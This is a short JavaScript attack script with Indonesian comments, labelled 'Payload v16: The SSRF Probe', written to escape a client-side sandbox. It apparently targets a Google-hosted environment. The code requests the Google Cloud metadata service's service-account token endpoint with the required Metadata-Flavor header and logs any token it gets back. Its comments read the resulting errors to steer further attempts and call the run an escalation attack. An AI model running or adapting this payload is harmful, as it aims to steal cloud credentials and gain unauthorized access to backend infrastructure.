/**
 * =============================================================================
 *  Payload v16: The SSRF Probe
 * =============================================================================
 * Tujuan:
 * 1. Menguji hipotesis bahwa `fetch` di-proxy melalui backend Google.
 * 2. Mencoba melakukan request ke alamat IP Google Cloud Metadata Service yang
 *    seharusnya tidak dapat dijangkau dari internet publik.
 * 3. Keberhasilan atau timeout (bukan 'connection refused') akan menjadi bukti
 *    kuat adanya kerentanan Server-Side Request Forgery (SSRF).
 * 4. Ini adalah upaya eskalasi akses dari sandbox klien ke infrastruktur backend.
 * =============================================================================
 */

async function probeInternalNetwork() {
    // Target utama: Header rekursif untuk mendapatkan service account token.
    const targetUrl = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token';
    const metadataHeaders = { 'Metadata-Flavor': 'Google' };

    log(`Probing for SSRF. Target: ${targetUrl}`);

    try {
        const response = await fetch(targetUrl, { headers: metadataHeaders });
        
        log('--- !!! SSRF PROBE SUCCEEDED !!! ---');
        log(`Status: ${response.status} ${response.statusText}`);
        const responseText = await response.text();
        log('--- RESPONSE BODY ---');
        log(responseText);
        log('--- END RESPONSE ---');
        log('Jika Anda melihat token di atas, kita telah berhasil mendapatkan akses ke service account!');

    } catch (err) {
        log(`SSRF Probe failed. This is expected, but analyze the error.`);
        log(`Error: ${err.name} - ${err.message}`);
        log(`Perhatikan baik-baik pesan error ini. 'Timeout' atau 'Network Error' lebih menjanjikan daripada 'Failed to fetch'. Periksa konsol browser utama untuk detail lebih lanjut.`);
    }
}

// Jalankan serangan eskalasi.
probeInternalNetwork();
